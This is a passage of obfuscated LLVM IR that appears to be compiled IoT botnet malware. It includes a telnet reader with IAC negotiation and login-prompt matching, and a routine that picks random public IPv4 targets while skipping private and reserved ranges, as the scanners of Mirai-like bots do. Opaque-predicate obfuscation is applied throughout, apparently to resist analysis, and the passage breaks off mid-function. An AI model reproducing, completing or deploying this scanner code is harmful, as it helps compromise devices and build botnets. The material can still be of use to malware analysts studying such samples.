  store i32 %147, i32* %6, align 4
  br label %11

; <label>:148:                                    ; preds = %originalBBpart2
  store i32 0, i32* %2, align 4
  br label %149

; <label>:149:                                    ; preds = %148, %143
  %150 = load i32, i32* %2, align 4
  ret i32 %150

originalBBalteredBB:                              ; preds = %originalBB, %11
  %151 = load i32, i32* %6, align 4
  %152 = sext i32 %151 to i64
  %153 = load i8*, i8** %4, align 8
  %154 = call i64 @strlen(i8* %153) #10
  %155 = icmp ult i64 %152, %154
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %86
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %109
  %156 = load i8*, i8** %3, align 8
  %157 = load i32, i32* %5, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i8, i8* %156, i64 %158
  %160 = load i32, i32* %7, align 4
  %161 = sext i32 %160 to i64
  %_ = sub i64 0, %161
  %gen = mul i64 %_, %161
  %_7 = shl i64 0, %161
  %_8 = sub i64 0, %161
  %gen9 = mul i64 %_8, %161
  %_10 = sub i64 0, 0
  %gen11 = add i64 %_10, %161
  %_12 = shl i64 0, %161
  %162 = sub i64 0, %161
  %163 = getelementptr inbounds i8, i8* %159, i64 %162
  %164 = load i8, i8* %163, align 1
  %165 = sext i8 %164 to i32
  %166 = load i8*, i8** %4, align 8
  %167 = load i32, i32* %6, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8, i8* %166, i64 %168
  %170 = load i8, i8* %169, align 1
  %171 = sext i8 %170 to i32
  %172 = icmp eq i32 %165, %171
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %248, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %80

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %62, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* @x.69
  %44 = load i32, i32* @y.70
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  %51 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %52 = load i64, i64* %51, align 8
  %53 = icmp sgt i64 %52, 0
  %54 = load i32, i32* @x.69
  %55 = load i32, i32* @y.70
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:62:                                     ; preds = %originalBBpart2, %38
  %63 = phi i1 [ true, %38 ], [ %53, %originalBBpart2 ]
  %64 = load i32, i32* @x.69
  %65 = load i32, i32* @y.70
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %62
  %72 = load i32, i32* @x.69
  %73 = load i32, i32* @y.70
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %80

; <label>:80:                                     ; preds = %originalBBpart24, %33
  %81 = phi i1 [ false, %33 ], [ %63, %originalBBpart24 ]
  br i1 %81, label %82, label %249

; <label>:82:                                     ; preds = %80
  br label %83

; <label>:83:                                     ; preds = %82
  %84 = load i32, i32* @x.69
  %85 = load i32, i32* @y.70
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %93 = getelementptr inbounds [16 x i64], [16 x i64]* %92, i64 0, i64 0
  %94 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %93) #2, !srcloc !5
  %95 = extractvalue { i64, i64* } %94, 0
  %96 = extractvalue { i64, i64* } %94, 1
  %97 = trunc i64 %95 to i32
  store i32 %97, i32* %24, align 4
  %98 = ptrtoint i64* %96 to i64
  %99 = trunc i64 %98 to i32
  store i32 %99, i32* %25, align 4
  %100 = load i32, i32* @x.69
  %101 = load i32, i32* @y.70
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %108

; <label>:108:                                    ; preds = %originalBBpart28
  %109 = load i32, i32* @x.69
  %110 = load i32, i32* @y.70
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %108
  %117 = load i32, i32* %10, align 4
  %118 = srem i32 %117, 64
  %119 = zext i32 %118 to i64
  %120 = shl i64 1, %119
  %121 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %122 = load i32, i32* %10, align 4
  %123 = sdiv i32 %122, 64
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds [16 x i64], [16 x i64]* %121, i64 0, i64 %124
  %126 = load i64, i64* %125, align 8
  %127 = or i64 %126, %120
  store i64 %127, i64* %125, align 8
  %128 = load i32, i32* %10, align 4
  %129 = add nsw i32 %128, 1
  %130 = call i32 @select(i32 %129, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %131 = icmp slt i32 %130, 1
  %132 = load i32, i32* @x.69
  %133 = load i32, i32* @y.70
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart244, label %originalBB10alteredBB

originalBBpart244:                                ; preds = %originalBB10
  br i1 %131, label %140, label %141

; <label>:140:                                    ; preds = %originalBBpart244
  br label %249

; <label>:141:                                    ; preds = %originalBBpart244
  %142 = load i8*, i8** %15, align 8
  %143 = load i32, i32* %18, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %142, i64 %144
  store i8* %145, i8** %23, align 8
  %146 = load i32, i32* %10, align 4
  %147 = load i8*, i8** %23, align 8
  %148 = call i64 @recv(i32 %146, i8* %147, i64 1, i32 0)
  %149 = trunc i64 %148 to i32
  store i32 %149, i32* %19, align 4
  %150 = load i32, i32* %19, align 4
  %151 = icmp eq i32 %150, -1
  br i1 %151, label %155, label %152

; <label>:152:                                    ; preds = %141
  %153 = load i32, i32* %19, align 4
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %156

; <label>:155:                                    ; preds = %152, %141
  store i32 0, i32* %9, align 4
  br label %270

; <label>:156:                                    ; preds = %152
  %157 = load i32, i32* @x.69
  %158 = load i32, i32* @y.70
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %156
  %165 = load i32, i32* %19, align 4
  %166 = load i32, i32* %18, align 4
  %167 = add nsw i32 %166, %165
  store i32 %167, i32* %18, align 4
  %168 = load i8*, i8** %23, align 8
  %169 = load i8, i8* %168, align 1
  %170 = zext i8 %169 to i32
  %171 = icmp eq i32 %170, 255
  %172 = load i32, i32* @x.69
  %173 = load i32, i32* @y.70
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart259, label %originalBB46alteredBB

originalBBpart259:                                ; preds = %originalBB46
  br i1 %171, label %180, label %218

; <label>:180:                                    ; preds = %originalBBpart259
  %181 = load i32, i32* %10, align 4
  %182 = load i8*, i8** %23, align 8
  %183 = getelementptr inbounds i8, i8* %182, i64 1
  %184 = call i64 @recv(i32 %181, i8* %183, i64 2, i32 0)
  %185 = trunc i64 %184 to i32
  store i32 %185, i32* %19, align 4
  %186 = load i32, i32* %19, align 4
  %187 = icmp eq i32 %186, -1
  br i1 %187, label %191, label %188

; <label>:188:                                    ; preds = %180
  %189 = load i32, i32* %19, align 4
  %190 = icmp eq i32 %189, 0
  br i1 %190, label %191, label %208

; <label>:191:                                    ; preds = %188, %180
  %192 = load i32, i32* @x.69
  %193 = load i32, i32* @y.70
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %191
  store i32 0, i32* %9, align 4
  %200 = load i32, i32* @x.69
  %201 = load i32, i32* @y.70
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %270

; <label>:208:                                    ; preds = %188
  %209 = load i32, i32* %19, align 4
  %210 = load i32, i32* %18, align 4
  %211 = add nsw i32 %210, %209
  store i32 %211, i32* %18, align 4
  %212 = load i32, i32* %10, align 4
  %213 = load i8*, i8** %23, align 8
  %214 = call i32 @negotiate(i32 %212, i8* %213, i32 3)
  %215 = icmp ne i32 %214, 0
  br i1 %215, label %217, label %216

; <label>:216:                                    ; preds = %208
  store i32 0, i32* %9, align 4
  br label %270

; <label>:217:                                    ; preds = %208
  br label %248

; <label>:218:                                    ; preds = %originalBBpart259
  %219 = load i8*, i8** %15, align 8
  %220 = load i8*, i8** %11, align 8
  %221 = call i8* @strstr(i8* %219, i8* %220) #10
  %222 = icmp ne i8* %221, null
  br i1 %222, label %246, label %223

; <label>:223:                                    ; preds = %218
  %224 = load i32, i32* %12, align 4
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %226, label %247

; <label>:226:                                    ; preds = %223
  %227 = load i32, i32* @x.69
  %228 = load i32, i32* @y.70
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %226
  %235 = load i8*, i8** %15, align 8
  %236 = call i32 @matchPrompt(i8* %235)
  %237 = icmp ne i32 %236, 0
  %238 = load i32, i32* @x.69
  %239 = load i32, i32* @y.70
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %237, label %246, label %247

; <label>:246:                                    ; preds = %originalBBpart267, %218
  store i32 1, i32* %20, align 4
  br label %249

; <label>:247:                                    ; preds = %originalBBpart267, %223
  br label %248

; <label>:248:                                    ; preds = %247, %217
  br label %33

; <label>:249:                                    ; preds = %246, %140, %80
  %250 = load i32, i32* %20, align 4
  %251 = icmp ne i32 %250, 0
  br i1 %251, label %252, label %269

; <label>:252:                                    ; preds = %249
  %253 = load i32, i32* @x.69
  %254 = load i32, i32* @y.70
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %252
  store i32 1, i32* %9, align 4
  %261 = load i32, i32* @x.69
  %262 = load i32, i32* @y.70
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %270

; <label>:269:                                    ; preds = %249
  store i32 0, i32* %9, align 4
  br label %270

; <label>:270:                                    ; preds = %269, %originalBBpart271, %216, %originalBBpart263, %155
  %271 = load i32, i32* %9, align 4
  ret i32 %271

originalBBalteredBB:                              ; preds = %originalBB, %42
  %272 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %273 = load i64, i64* %272, align 8
  %274 = icmp sgt i64 %273, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %62
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  %275 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %276 = getelementptr inbounds [16 x i64], [16 x i64]* %275, i64 0, i64 0
  %277 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %276) #2, !srcloc !5
  %278 = extractvalue { i64, i64* } %277, 0
  %279 = extractvalue { i64, i64* } %277, 1
  %280 = trunc i64 %278 to i32
  store i32 %280, i32* %24, align 4
  %281 = ptrtoint i64* %279 to i64
  %282 = trunc i64 %281 to i32
  store i32 %282, i32* %25, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %108
  %283 = load i32, i32* %10, align 4
  %_ = sub i32 %283, 64
  %gen = mul i32 %_, 64
  %_11 = sub i32 %283, 64
  %gen12 = mul i32 %_11, 64
  %_13 = sub i32 0, %283
  %gen14 = add i32 %_13, 64
  %_15 = sub i32 %283, 64
  %gen16 = mul i32 %_15, 64
  %284 = srem i32 %283, 64
  %285 = zext i32 %284 to i64
  %_17 = sub i64 0, 1
  %gen18 = add i64 %_17, %285
  %_19 = shl i64 1, %285
  %_20 = shl i64 1, %285
  %_21 = sub i64 0, 1
  %gen22 = add i64 %_21, %285
  %_23 = sub i64 0, 1
  %gen24 = add i64 %_23, %285
  %286 = shl i64 1, %285
  %287 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %288 = load i32, i32* %10, align 4
  %_25 = shl i32 %288, 64
  %_26 = shl i32 %288, 64
  %_27 = shl i32 %288, 64
  %_28 = sub i32 0, %288
  %gen29 = add i32 %_28, 64
  %_30 = shl i32 %288, 64
  %_31 = shl i32 %288, 64
  %289 = sdiv i32 %288, 64
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds [16 x i64], [16 x i64]* %287, i64 0, i64 %290
  %292 = load i64, i64* %291, align 8
  %_32 = sub i64 0, %292
  %gen33 = add i64 %_32, %286
  %_34 = shl i64 %292, %286
  %_35 = sub i64 %292, %286
  %gen36 = mul i64 %_35, %286
  %_37 = shl i64 %292, %286
  %_38 = shl i64 %292, %286
  %293 = or i64 %292, %286
  store i64 %293, i64* %291, align 8
  %294 = load i32, i32* %10, align 4
  %_39 = sub i32 %294, 1
  %gen40 = mul i32 %_39, 1
  %_41 = sub i32 %294, 1
  %gen42 = mul i32 %_41, 1
  %295 = add nsw i32 %294, 1
  %296 = call i32 @select(i32 %295, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %297 = icmp slt i32 %296, 1
  br label %originalBB10

originalBB46alteredBB:                            ; preds = %originalBB46, %156
  %298 = load i32, i32* %19, align 4
  %299 = load i32, i32* %18, align 4
  %_47 = sub i32 0, %299
  %gen48 = add i32 %_47, %298
  %_49 = sub i32 0, %299
  %gen50 = add i32 %_49, %298
  %_51 = sub i32 0, %299
  %gen52 = add i32 %_51, %298
  %_53 = shl i32 %299, %298
  %_54 = sub i32 0, %299
  %gen55 = add i32 %_54, %298
  %_56 = sub i32 %299, %298
  %gen57 = mul i32 %_56, %298
  %300 = add nsw i32 %299, %298
  store i32 %300, i32* %18, align 4
  %301 = load i8*, i8** %23, align 8
  %302 = load i8, i8* %301, align 1
  %303 = zext i8 %302 to i32
  %304 = icmp eq i32 %303, 255
  br label %originalBB46

originalBB61alteredBB:                            ; preds = %originalBB61, %191
  store i32 0, i32* %9, align 4
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %226
  %305 = load i8*, i8** %15, align 8
  %306 = call i32 @matchPrompt(i8* %305)
  %307 = icmp ne i32 %306, 0
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %252
  store i32 1, i32* %9, align 4
  br label %originalBB69
}

; Function Attrs: noinline nounwind uwtable
define i32 @getDatIP() #0 {
  %1 = load i32, i32* @x.71
  %2 = load i32, i32* @y.72
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca [4 x i8], align 1
  %10 = alloca [16 x i8], align 16
  %11 = bitcast [4 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %11, i8 0, i64 4, i32 1, i1 false)
  %12 = call i32 @rand() #2
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  %15 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  store i8 %14, i8* %15, align 1
  %16 = call i32 @rand() #2
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  %19 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  store i8 %18, i8* %19, align 1
  %20 = call i32 @rand() #2
  %21 = srem i32 %20, 255
  %22 = trunc i32 %21 to i8
  %23 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  store i8 %22, i8* %23, align 1
  %24 = call i32 @rand() #2
  %25 = srem i32 %24, 255
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 %26, i8* %27, align 1
  %28 = load i32, i32* @x.71
  %29 = load i32, i32* @y.72
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %36

; <label>:36:                                     ; preds = %489, %originalBBpart2
  %37 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %487, label %41

; <label>:41:                                     ; preds = %36
  %42 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %43 = load i8, i8* %42, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 10
  br i1 %45, label %487, label %46

; <label>:46:                                     ; preds = %41
  %47 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 100
  br i1 %50, label %51, label %61

; <label>:51:                                     ; preds = %46
  %52 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp sge i32 %54, 64
  br i1 %55, label %56, label %61

; <label>:56:                                     ; preds = %51
  %57 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sle i32 %59, 127
  br i1 %60, label %487, label %61

; <label>:61:                                     ; preds = %56, %51, %46
  %62 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 127
  br i1 %65, label %487, label %66

; <label>:66:                                     ; preds = %61
  %67 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %68 = load i8, i8* %67, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 169
  br i1 %70, label %71, label %76

; <label>:71:                                     ; preds = %66
  %72 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 %74, 254
  br i1 %75, label %487, label %76

; <label>:76:                                     ; preds = %71, %66
  %77 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 172
  br i1 %80, label %81, label %107

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* @x.71
  %83 = load i32, i32* @y.72
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %81
  %90 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  %93 = icmp sle i32 %92, 16
  %94 = load i32, i32* @x.71
  %95 = load i32, i32* @y.72
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %93, label %102, label %107

; <label>:102:                                    ; preds = %originalBBpart231
  %103 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %104 = load i8, i8* %103, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp sle i32 %105, 31
  br i1 %106, label %487, label %107

; <label>:107:                                    ; preds = %102, %originalBBpart231, %76
  %108 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %109 = load i8, i8* %108, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 192
  br i1 %111, label %112, label %122

; <label>:112:                                    ; preds = %107
  %113 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %114 = load i8, i8* %113, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 0
  br i1 %116, label %117, label %122

; <label>:117:                                    ; preds = %112
  %118 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 2
  br i1 %121, label %487, label %122

; <label>:122:                                    ; preds = %117, %112, %107
  %123 = load i32, i32* @x.71
  %124 = load i32, i32* @y.72
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %122
  %131 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %132 = load i8, i8* %131, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 192
  %135 = load i32, i32* @x.71
  %136 = load i32, i32* @y.72
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %134, label %143, label %153

; <label>:143:                                    ; preds = %originalBBpart235
  %144 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 88
  br i1 %147, label %148, label %153

; <label>:148:                                    ; preds = %143
  %149 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 2
  %150 = load i8, i8* %149, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 99
  br i1 %152, label %487, label %153

; <label>:153:                                    ; preds = %148, %143, %originalBBpart235
  %154 = load i32, i32* @x.71
  %155 = load i32, i32* @y.72
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %153
  %162 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %163 = load i8, i8* %162, align 1
  %164 = zext i8 %163 to i32
  %165 = icmp eq i32 %164, 192
  %166 = load i32, i32* @x.71
  %167 = load i32, i32* @y.72
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %165, label %174, label %195

; <label>:174:                                    ; preds = %originalBBpart239
  %175 = load i32, i32* @x.71
  %176 = load i32, i32* @y.72
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %174
  %183 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 1
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 168
  %187 = load i32, i32* @x.71
  %188 = load i32, i32* @y.72
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %186, label %487, label %195

; <label>:195:                                    ; preds = %originalBBpart243, %originalBBpart239
